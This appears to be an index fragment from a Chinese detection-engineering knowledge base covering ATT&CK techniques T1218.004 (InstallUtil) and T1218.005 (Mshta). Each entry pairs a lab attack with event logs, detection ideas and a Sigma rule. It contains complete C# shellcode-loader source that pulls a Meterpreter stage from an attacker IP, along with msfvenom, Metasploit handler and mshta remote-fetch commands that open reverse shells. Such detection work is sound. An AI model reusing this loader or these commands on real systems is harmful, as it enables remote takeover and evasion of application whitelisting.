{{ MessageBox.Show(\"doge\"); Console.ReadLine();}} } } [System.ComponentModel.RunInstaller(true)] public class esxWUYUTWShqW : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu) { jkmhGrfzsKQeCG.LCIUtRN(); } } public class jkmhGrfzsKQeCG { [DllImport(\"kernel\")] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq); static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) { IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo); Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); try { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); } catch { return null;} byte[] UmquAHRnhhpuE = new byte[4]; XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0); int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0); byte[] qaYyFq = new byte[kFVRSNnpj +5]; int SRCDELibA =0; while(SRCDELibA < kFVRSNnpj) { SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)<4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);} byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle); Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF; return qaYyFq;} static void cmMtjerv(byte[] HEHUjJhkrNS) { if(HEHUjJhkrNS !=null) { UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40); Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length); IntPtr UhxtIFnlOQatrk = IntPtr.Zero; UInt32 wdjYKFDCCf =0; IntPtr XVYcQxpp = IntPtr.Zero; UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf); WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }} public static void LCIUtRN() { byte[] IBtCWU =null; IBtCWU = ErlgHH(\"192.168.126.146\",4444); cmMtjerv(IBtCWU); } } \u7f16\u8bd1payload C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /unsafe C:\\Users\\Administrator\\Desktop\\a\\installutil.cs \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit \u6267\u884cpayload C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe \u53cd\u5f39shell \u6d4b\u8bd5\u7559\u75d5 EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-004 https://attack.mitre.org/techniques/T1218/004/ \u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload https://micro8.gitbook.io/micro8/contents-1/71-80/72-ji-yu-bai-ming-dan-installutil.exe-zhi-hang-payload-di-er-ji \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"T1218-004-win-\u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#t1218-004-win-installutilexepayload","text":"","title":"T1218-004-win-\u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fInstallUtil\u53ef\u7528\u4e8e\u901a\u8fc7\u6267\u884c.NET\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u6307\u5b9a\u7684\u7279\u5b9a\u5b89\u88c5\u7a0b\u5e8f\u7ec4\u4ef6\u6765\u5b89\u88c5\u548c\u5378\u8f7d\u8d44\u6e90\u3002 InstallUtil\u4f4d\u4e8eWindows\u7cfb\u7edf\u4e0a\u7684.NET\u76ee\u5f55\u4e2d\uff1a C:\\Windows\\Microsoft.NET\\Framework\\v\\InstallUtil.exe C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe InstallUtil.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528InstallUtil\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u7528Installutil\u6765\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u4f7f\u7528\u5c5e\u6027\uff0c\u8fd9\u4e9b\u5c5e\u6027\u6267\u884c\u7528\u5c5e\u6027[System.ComponentModel.RunInstaller(true)]\u4fee\u9970\u7684\u7c7b\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_1","text":"\u8bf4\u660e\uff1aInstallutil.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cInstallutil\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#x64-cs","text":"using System;using System.Net;using System.Linq;using System.Net.Sockets;using System.Runtime.InteropServices;using System.Threading;using System.Configuration.Install;using System.Windows.Forms; public class GQLBigHgUniLuVx { public static void Main() { while(true) {{ MessageBox.Show(\"doge\"); Console.ReadLine();}} } } [System.ComponentModel.RunInstaller(true)] public class esxWUYUTWShqW : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu) { jkmhGrfzsKQeCG.LCIUtRN(); } } public class jkmhGrfzsKQeCG { [DllImport(\"kernel\")] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq); static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) { IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo); Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); try { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); } catch { return null;} byte[] UmquAHRnhhpuE = new byte[4]; XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0); int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0); byte[] qaYyFq = new byte[kFVRSNnpj +5]; int SRCDELibA =0; while(SRCDELibA < kFVRSNnpj) { SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)<4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);} byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle); Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF; return qaYyFq;} static void cmMtjerv(byte[] HEHUjJhkrNS) { if(HEHUjJhkrNS !=null) { UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40); Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length); IntPtr UhxtIFnlOQatrk = IntPtr.Zero; UInt32 wdjYKFDCCf =0; IntPtr XVYcQxpp = IntPtr.Zero; UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf); WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }} public static void LCIUtRN() { byte[] IBtCWU =null; IBtCWU = ErlgHH(\"192.168.126.146\",4444); cmMtjerv(IBtCWU); } }","title":"x64 CS"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#payload","text":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /unsafe C:\\Users\\Administrator\\Desktop\\a\\installutil.cs","title":"\u7f16\u8bd1payload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploits/multi/handler msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp PAYLOAD => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 4444 lport => 4444 msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","text":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe","title":"\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#shell","text":"","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_7","text":"EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_8","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_9","text":"MITRE-ATT&CK-T1218-004 https://attack.mitre.org/techniques/T1218/004/ \u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload https://micro8.gitbook.io/micro8/contents-1/71-80/72-ji-yu-bai-ming-dan-installutil.exe-zhi-hang-payload-di-er-ji \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T1218-005-win-\u57fa\u4e8e\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Mshta.exe\u662f\u4e00\u4e2a\u6267\u884c\u5fae\u8f6fHTA\uff08HTML\u5e94\u7528\uff09\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002HTA\u6587\u4ef6\u6269\u5c55\u540d\u4e3a.hta\u3002HTA\u662f\u72ec\u7acb\u7684\u5e94\u7528\uff0c\u4f7f\u7528\u4e0eInternetExplorer\u76f8\u540c\u7684\u6a21\u578b\u548c\u6280\u672f\u6765\u6267\u884c\uff0c\u4f46\u5728\u6d4f\u89c8\u5668\u4e4b\u5916\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528mshta.exe\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u6076\u610f.hta\u6587\u4ef6\u548cJavascript\u6216VBScript\u3002\u5df2\u77e5\u653b\u51fb\u8005\u5728\u6700\u521d\u653b\u51fb\u9636\u6bb5\u5229\u7528mshta.exe\u6765\u6267\u884c\u4ee3\u7801\u7684\u51e0\u4e2a\u4f8b\u5b50\u3002 Mshta.exe\u53ef\u901a\u8fc7\u5185\u8054\u811a\u672c\u6765\u6267\u884c\u6587\u4ef6\uff1amshtavbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) \u4e5f\u53ef\u4ee5\u76f4\u63a5\u4eceURL\u6267\u884c\uff1amshta http[:]//webserver/payload[.]hta Mshta.exe\u53ef\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u7528\u9014\u7684\u5e94\u7528\u767d\u540d\u5355\u89e3\u51b3\u65b9\u6848\u3002\u7531\u4e8emshta.exe\u5728InternetExplorer\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u4e4b\u5916\u6267\u884c\uff0c\u56e0\u6b64\u5b83\u8fd8\u4f1a\u7ed5\u8fc7\u6d4f\u89c8\u5668\u5b89\u5168\u8bbe\u7f6e\u3002 \u6d4b\u8bd5\u6848\u4f8b Mshta.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u7a0b\u5e8f\uff0c\u82f1\u6587\u5168\u79f0Microsoft HTML Application\uff0c\u53ef\u7ffb\u8bd1\u4e3a\u5fae\u8f6f\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u5e94\u7528\uff0c\u7528\u4e8e\u6267\u884c.HTA\u6587\u4ef6\u3002 \u8bf4\u660e\uff1aMshta\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0c\u53ef\u76f4\u63a5\u6267\u884cMshta.exe\u547d\u4ee4\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\mshta.exe C:\\Windows\\SysWOW64\\mshta.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u653b\u51fb\u5206\u6790 \u751f\u6210payload root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f hta-psh -o test5.hta \u66ff\u6362\u76f8\u5173\u4fe1\u606f \u6267\u884c\u76d1\u542c use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) > set lhost 192.168.126.146 msf exploit(windows/misc/hta_server) > set srvhost 192.168.126.146 msf exploit(windows/misc/hta_server) > exploit \u9776\u673a\u6267\u884cpayload mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta #\u9700\u8981\u5b89\u88c5.net Framework 3.5 \u53cd\u5f39shell msf5 exploit(windows/misc/hta_server) > exploit [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Using URL: http://192.168.126.146:8080/Uj6Tcv.hta [*] Server started. msf5 exploit(windows/misc/hta_server) > [*] 192.168.126.156 hta_server - Delivering Payload [*] Sending stage (180291 bytes) to 192.168.126.156 [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.156:50232) at 2020-04-14 11:03:33 +0800 \u6d4b\u8bd5\u7559\u75d5 \u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xb20 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\mshta.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c \u8fdb\u7a0b\u547d\u4ee4\u884c:mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790mshta.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u67e5\u627e\u5728\u547d\u4ee4\u884c\u4e2d\u6267\u884c\u539f\u59cb\u6216\u6df7\u6dc6\u811a\u672c\u7684mshta.exe\u3002\u6bd4\u8f83mshta.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728mshta.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 sigma\u89c4\u5219 title: MSHTA Suspicious Execution 01 id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3 status: experimental description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism date: 2019/02/22 modified: 2019/02/22 author: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule) references: - http://blog.sevagas.com/?Hacking-around-HTA-files - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356 - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997 tags: - attack.defense_evasion - attack.t1140 logsource: category: process_creation product: windows falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high detection: selection1: Image: '*\\mshta.exe' CommandLine: - '*vbscript*' - '*.jpg*' - '*.png*' - '*.lnk*' # - '*.chm*' # could be prone to false positives - '*.xls*' - '*.doc*' - '*.zip*' condition: selection1 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-005 https://attack.mitre.org/techniques/T1218/005/ \u8fdc\u63a7\u514d\u6740\u4e13\u9898(37)-\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload http://sec.nmask.cn/article_content?a_id=d1a4d20858c9283aef9ef49d2e98352c \u68c0\u6d4b\u53ef\u7591\u7684Mshta\u4f7f\u7528\u60c5\u51b5 https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/detect-suspicious-mshta-usage.md","title":"T1218-005-win-\u57fa\u4e8e\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#t1218-005-win-mshtaexepayload","text":"","title":"T1218-005-win-\u57fa\u4e8e\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#attck","text":"Mshta.exe\u662f\u4e00\u4e2a\u6267\u884c\u5fae\u8f6fHTA\uff08HTML\u5e94\u7528\uff09\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002HTA\u6587\u4ef6\u6269\u5c55\u540d\u4e3a.hta\u3002HTA\u662f\u72ec\u7acb\u7684\u5e94\u7528\uff0c\u4f7f\u7528\u4e0eInternetExplorer\u76f8\u540c\u7684\u6a21\u578b\u548c\u6280\u672f\u6765\u6267\u884c\uff0c\u4f46\u5728\u6d4f\u89c8\u5668\u4e4b\u5916\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528mshta.exe\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u6076\u610f.hta\u6587\u4ef6\u548cJavascript\u6216VBScript\u3002\u5df2\u77e5\u653b\u51fb\u8005\u5728\u6700\u521d\u653b\u51fb\u9636\u6bb5\u5229\u7528mshta.exe\u6765\u6267\u884c\u4ee3\u7801\u7684\u51e0\u4e2a\u4f8b\u5b50\u3002 Mshta.exe\u53ef\u901a\u8fc7\u5185\u8054\u811a\u672c\u6765\u6267\u884c\u6587\u4ef6\uff1amshtavbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) \u4e5f\u53ef\u4ee5\u76f4\u63a5\u4eceURL\u6267\u884c\uff1amshta http[:]//webserver/payload[.]hta 